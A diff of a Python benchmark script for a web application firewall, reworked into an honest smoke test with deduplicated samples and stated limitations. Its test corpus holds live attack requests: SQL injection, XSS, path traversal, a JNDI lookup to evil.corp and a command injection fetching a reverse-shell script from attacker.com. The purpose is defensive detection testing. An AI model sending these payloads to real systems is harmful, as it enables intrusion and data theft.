@@ -1,57 +1,52 @@
 #!/usr/bin/env python3
-"""
-APPAWARE-WAF BENCHMARK & EVALUATION ENGINE
-Script: scripts/benchmark_waf.py
+"""Run a small local regression smoke check and a separate timing loop.
 
-Performs rigorous benchmarking of the hybrid WAF pipeline:
-1. Detection accuracy across OWASP Top 10 attack vectors vs Benign traffic.
-2. Latency profiling (Deterministic, Transformer, Fusion Policy, Total P50/P95/P99).
-3. False Positive Rate (FPR) and False Negative Rate (FNR) validation.
-4. Generates publication-ready IEEE style evaluation tables and JSON reports.
+This handcrafted corpus is not a publication dataset. Accuracy is measured once
+per unique canonical request; repeated runs are used only for latency.
+Use evaluate_dataset.py for deduplicated, group-held-out evaluation.
 """
 
+import hashlib
+import json
 import os
+import platform
+import statistics
 import sys
 import time
-import json
-import statistics
-from typing import List, Dict, Any
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Any
 
-# Ensure root directory is in path
-sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
+ROOT = Path(__file__).resolve().parents[1]
+sys.path.insert(0, str(ROOT))
 
+from waf.normalization.canonicalizer import Canonicalizer
+from waf.rules.deterministic_engine import DeterministicRuleEngine
+from waf.inference.model_engine import create_default_scorer
 from waf.pipeline import WafPipeline
+from waf.risk.policy_engine import PolicyEngine
 
-# Benchmark Corpus (Sample Representative Payloads)
+# (category, raw HTTP request, is_attack)
 BENCHMARK_PAYLOADS = [
-    # 1. SQL Injection
     ("SQLI", "GET /users?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1", True),
     ("SQLI", "POST /login HTTP/1.1\nHost: app.local\n\nuser=admin' OR '1'='1&pass=foo", True),
     ("SQLI", "GET /search?q=1;%20DROP%20TABLE%20accounts;-- HTTP/1.1", True),
     ("SQLI", "GET /items?cat=1%20AND%20SLEEP(5)-- HTTP/1.1", True),
     ("SQLI", "GET /data?val=1'%20AND%20extractvalue(1,concat(0x7e,(select%20user())))-- HTTP/1.1", True),
-    
-    # 2. Cross-Site Scripting (XSS)
     ("XSS", "POST /comments HTTP/1.1\nHost: app.local\n\ntext=<script>alert('xss')</script>", True),
     ("XSS", "GET /search?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1", True),
     ("XSS", "GET /profile?bio=%3Csvg/onload=confirm(1)%3E HTTP/1.1", True),
     ("XSS", "GET /view?page=javascript:/*--%3E%3Csvg/onload='/*%60/*/%2balert(1)//'%3E HTTP/1.1", True),
     ("XSS", "POST /feedback HTTP/1.1\nHost: app.local\n\nmsg=<iframe src=\"javascript:alert(1)\">", True),
-
-    # 3. Remote Code Execution (RCE) / Command Injection
     ("RCE", "POST /ping HTTP/1.1\nHost: app.local\n\nip=127.0.0.1;cat /etc/passwd", True),
     ("RCE", "GET /status?host=localhost%7C%7Ccurl%20http://attacker.com/revshell.sh HTTP/1.1", True),
     ("RCE", "POST /exec HTTP/1.1\nHost: app.local\n\ncmd=%26%26powershell.exe%20-EncodedCommand%20AAA", True),
     ("RCE", "GET /log?msg=${jndi:ldap://evil.corp/a} HTTP/1.1", True),
     ("RCE", "GET /backup?path=test%60id%60 HTTP/1.1", True),
-
-    # 4. Path Traversal & LFI
     ("TRAVERSAL", "GET /static/../../../../etc/shadow HTTP/1.1", True),
     ("TRAVERSAL", "GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1", True),
     ("TRAVERSAL", "GET /view?doc=....//....//....//windows/system.ini HTTP/1.1", True),
     ("TRAVERSAL", "GET /load?path=%252e%252e%252f%252e%252e%252fboot.ini HTTP/1.1", True),
-
-    # 5. Benign HTTP Traffic
     ("BENIGN", "GET / HTTP/1.1\nHost: myapp.org\nUser-Agent: Mozilla/5.0", False),
     ("BENIGN", "GET /api/v1/products?category=electronics&sort=asc&page=2 HTTP/1.1", False),
     ("BENIGN", "POST /api/v1/login HTTP/1.1\nHost: myapp.org\nContent-Type: application/json\n\n{\"username\":\"alice\",\"password\":\"S3cureP@ssword!\"}", False),
@@ -64,140 +59,124 @@ BENCHMARK_PAYLOADS = [
     ("BENIGN", "GET /api/v1/notifications?unread=true&limit=10 HTTP/1.1", False),
 ]
 
-def run_benchmark():
-    print("=" * 80)
-    print(" APPAWARE-WAF: AUTOMATED SECURITY & LATENCY BENCHMARK")
-    print(" Multi-Stage Inspection: Normalization -> Rules -> Profile -> Transformer -> Risk")
-    print("=" * 80)
 
-    waf = WafPipeline(mode="ENFORCING")
-
-    # Metrics accumulators
-    total_samples = 0
-    true_positives = 0
-    false_positives = 0
-    true_negatives = 0
-    false_negatives = 0
-
-    latencies_det: List[float] = []
-    latencies_ml: List[float] = []
-    latencies_total: List[float] = []
-
-    category_results: Dict[str, Dict[str, int]] = {}
-
-    # Run inspection
-    # Repeat corpus to obtain statistical sample (e.g. 50 iterations -> 1450 executions)
-    iterations = 50
-    start_bench = time.perf_counter()
-
-    for _ in range(iterations):
-        for category, raw_request, is_malicious in BENCHMARK_PAYLOADS:
-            total_samples += 1
-            if category not in category_results:
-                category_results[category] = {"total": 0, "blocked": 0, "allowed": 0}
-            category_results[category]["total"] += 1
-
-            t0 = time.perf_counter()
-            event = waf.inspect_request(raw_request)
-            t_total = (time.perf_counter() - t0) * 1000.0
-
-            decision = event["decision"]
-            is_blocked = (decision == "BLOCK")
-
-            if is_blocked:
-                category_results[category]["blocked"] += 1
-            else:
-                category_results[category]["allowed"] += 1
-
-            if is_malicious:
-                if is_blocked:
-                    true_positives += 1
-                else:
-                    false_negatives += 1
-            else:
-                if is_blocked:
-                    false_positives += 1
-                else:
-                    true_negatives += 1
-
-            latencies_total.append(t_total)
-            latencies_det.append(event.get("signals", {}).get("deterministic_score", 0.0))
-
-    elapsed = time.perf_counter() - start_bench
-    throughput_rps = total_samples / max(elapsed, 0.001)
-
-    # Sort latencies
-    sorted_latencies = sorted(latencies_total)
-    p50 = sorted_latencies[int(len(sorted_latencies) * 0.50)]
-    p95 = sorted_latencies[int(len(sorted_latencies) * 0.95)]
-    p99 = sorted_latencies[int(len(sorted_latencies) * 0.99)]
-    mean_lat = statistics.mean(sorted_latencies)
-
-    # Statistical Performance
-    accuracy = (true_positives + true_negatives) / total_samples
-    precision = true_positives / max(true_positives + false_positives, 1)
-    recall = true_positives / max(true_positives + false_negatives, 1)
-    f1 = 2 * (precision * recall) / max(precision + recall, 1e-6)
-    fpr = false_positives / max(false_positives + true_negatives, 1)
-    fnr = false_negatives / max(false_negatives + true_positives, 1)
-
-    # Print Summary Tables
-    print(f"\n[+] Executed {total_samples:,} payload inspections across {len(category_results)} categories in {elapsed:.3f}s")
-    print(f"[+] Average Throughput: {throughput_rps:,.1f} requests/sec")
-    print("\n" + "-" * 80)
-    print(f"{'CATEGORY':<16} | {'TOTAL':<8} | {'BLOCKED':<8} | {'ALLOWED':<8} | {'DETECTION RATE':<15}")
-    print("-" * 80)
-    for cat, data in category_results.items():
-        rate = (data["blocked"] / data["total"]) * 100 if cat != "BENIGN" else (data["allowed"] / data["total"]) * 100
-        label = "Pass Rate" if cat == "BENIGN" else "Block Rate"
-        print(f"{cat:<16} | {data['total']:<8} | {data['blocked']:<8} | {data['allowed']:<8} | {rate:>6.2f}% ({label})")
-    print("-" * 80)
-
-    print("\n" + "=" * 80)
-    print(" ACADEMIC & DEFENSE METRICS (IEEE FORMAT)")
-    print("=" * 80)
-    print(f" Accuracy:                 {accuracy * 100:6.2f}%")
-    print(f" Precision:                {precision * 100:6.2f}%")
-    print(f" Recall (True Pos Rate):   {recall * 100:6.2f}%")
-    print(f" F1-Score:                 {f1 * 100:6.2f}%")
-    print(f" False Positive Rate (FPR): {fpr * 100:6.2f}% (Target: < 0.1%)")
-    print(f" False Negative Rate (FNR): {fnr * 100:6.2f}%")
-    print("-" * 80)
-    print(" LATENCY PROFILING")
-    print(f" Mean Latency:             {mean_lat:6.3f} ms")
-    print(f" P50 Latency (Median):     {p50:6.3f} ms")
-    print(f" P95 Latency:              {p95:6.3f} ms")
-    print(f" P99 Latency:              {p99:6.3f} ms")
-    print("=" * 80)
-
-    # Save to JSON
-    report = {
-        "timestamp": time.time(),
-        "total_samples": total_samples,
-        "throughput_rps": round(throughput_rps, 1),
-        "metrics": {
-            "accuracy": round(accuracy, 4),
-            "precision": round(precision, 4),
-            "recall": round(recall, 4),
-            "f1_score": round(f1, 4),
-            "fpr": round(fpr, 4),
-            "fnr": round(fnr, 4)
-        },
-        "latency_ms": {
-            "mean": round(mean_lat, 3),
-            "p50": round(p50, 3),
-            "p95": round(p95, 3),
-            "p99": round(p99, 3)
-        },
-        "breakdown": category_results
+def confusion(labels: list[int], predictions: list[int]) -> dict[str, int]:
+    return {
+        "tp": sum(y == 1 and p == 1 for y, p in zip(labels, predictions)),
+        "tn": sum(y == 0 and p == 0 for y, p in zip(labels, predictions)),
+        "fp": sum(y == 0 and p == 1 for y, p in zip(labels, predictions)),
+        "fn": sum(y == 1 and p == 0 for y, p in zip(labels, predictions)),
     }
 
-    report_path = os.path.join(os.path.dirname(__file__), "..", "benchmark_results.json")
-    with open(report_path, "w", encoding="utf-8") as f:
-        json.dump(report, f, indent=2)
 
-    print(f"\n[OK] Benchmark report saved to: {os.path.normpath(report_path)}\n")
+def metrics(counts: dict[str, int], total: int) -> dict[str, Any]:
+    tp, tn, fp, fn = counts["tp"], counts["tn"], counts["fp"], counts["fn"]
+    precision = tp / (tp + fp) if tp + fp else 0.0
+    recall = tp / (tp + fn) if tp + fn else 0.0
+    return {
+        "n": total,
+        **counts,
+        "accuracy": round((tp + tn) / total, 6) if total else None,
+        "precision": round(precision, 6),
+        "recall": round(recall, 6),
+        "f1_score": round(2 * precision * recall / (precision + recall), 6) if precision + recall else 0.0,
+        "fpr": round(fp / (fp + tn), 6) if fp + tn else None,
+        "fnr": round(fn / (fn + tp), 6) if fn + tp else None,
+    }
+
+
+def percentile(values: list[float], fraction: float) -> float:
+    ordered = sorted(values)
+    return ordered[min(len(ordered) - 1, max(0, int((len(ordered) - 1) * fraction)))]
+
+
+def run_benchmark(iterations: int = 50) -> dict[str, Any]:
+    canonicalizer = Canonicalizer()
+    unique: dict[str, tuple[str, str, bool]] = {}
+    for category, raw, is_attack in BENCHMARK_PAYLOADS:
+        canonical = canonicalizer.parse_raw_http_request(raw)["canonical_text"]
+        digest = hashlib.sha256(canonical.encode("utf-8")).hexdigest()
+        unique.setdefault(digest, (category, raw, is_attack))
+    examples = list(unique.values())
+    labels = [int(row[2]) for row in examples]
+    scorer = create_default_scorer()
+    rules = DeterministicRuleEngine()
+    policy = PolicyEngine(mode="ENFORCING")
+    hybrid_pipeline = WafPipeline(mode="ENFORCING", model_inference_fn=scorer.predict)
+    timing_pipeline = WafPipeline(mode="ENFORCING", model_inference_fn=scorer.predict)
+
+    predictions: dict[str, list[int]] = {"rules_only": [], "heuristic_only": [], "hybrid_rules_heuristic": []}
+    category_counts: dict[str, dict[str, int]] = {}
+    for category, raw, is_attack in examples:
+        parsed = canonicalizer.parse_raw_http_request(raw)
+        det_score, matches = rules.inspect(parsed)
+        heuristic_score = scorer.predict(parsed["canonical_text"])
+        rules_result = policy.evaluate(det_score, 0.0, 0.0, matches, parsed["anomaly_flags"])
+        heuristic_result = int(heuristic_score >= 0.70)
+        hybrid_result = int(hybrid_pipeline.inspect_request(raw)["decision"] == "BLOCK")
+        values = {
+            "rules_only": int(rules_result.action == "BLOCK"),
+            "heuristic_only": heuristic_result,
+            "hybrid_rules_heuristic": hybrid_result,
+        }
+        for name, prediction in values.items():
+            predictions[name].append(prediction)
+        counts = category_counts.setdefault(category, {"total": 0, "blocked": 0, "allowed": 0})
+        counts["total"] += 1
+        if hybrid_result:
+            counts["blocked"] += 1
+        else:
+            counts["allowed"] += 1
+
+    # Warmup is excluded. Repetitions below measure timing only; they never inflate
+    # the sample count used in confusion matrices or accuracy.
+    for _ in range(min(iterations, 10)):
+        for _, raw, _ in examples:
+            timing_pipeline.inspect_request(raw)
+    latencies_ms: list[float] = []
+    started = time.perf_counter()
+    for _ in range(iterations):
+        for _, raw, _ in examples:
+            tick = time.perf_counter()
+            timing_pipeline.inspect_request(raw)
+            latencies_ms.append((time.perf_counter() - tick) * 1000.0)
+    elapsed = time.perf_counter() - started
+
+    labels_by_lane = {name: metrics(confusion(labels, lane_predictions), len(examples)) for name, lane_predictions in predictions.items()}
+    report = {
+        "report_type": "local_smoke_benchmark",
+        "created_at_utc": datetime.now(timezone.utc).isoformat(),
+        "evidence_scope": "Regression check on handcrafted examples only; not a publication or production performance claim.",
+        "unique_samples": len(examples),
+        "timing_iterations_per_sample": iterations,
+        "timed_inspections": len(latencies_ms),
+        "throughput_rps": round(len(latencies_ms) / max(elapsed, 1e-9), 2),
+        "dataset_sha256": hashlib.sha256("\n".join(sorted(unique)).encode()).hexdigest(),
+        "metrics_by_lane": labels_by_lane,
+        "breakdown": category_counts,
+        "latency_ms": {
+            "mean": round(statistics.mean(latencies_ms), 4),
+            "p50": round(percentile(latencies_ms, 0.50), 4),
+            "p95": round(percentile(latencies_ms, 0.95), 4),
+            "p99": round(percentile(latencies_ms, 0.99), 4),
+        },
+        "environment": {
+            "python": sys.version.split()[0], "platform": platform.platform(),
+            "processor": platform.processor() or None, "cpu_count": os.cpu_count(),
+        },
+        "limitations": [
+            "Only 29 handcrafted requests are present in this corpus.",
+            "Accuracy metrics count each unique canonical request once; timing repetitions are not counted as new samples.",
+            "The heuristic is not a trained Transformer and latency excludes HTTP/network/upstream time.",
+            "No confidence intervals are reported for this small demo corpus; use evaluate_dataset.py for grouped evaluation.",
+        ],
+    }
+    report_path = ROOT / "benchmark_results.json"
+    report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
+    print(json.dumps(report, indent=2))
+    print(f"\nSmoke report saved to {report_path}")
     return report
+
 
 if __name__ == "__main__":
     run_benchmark()
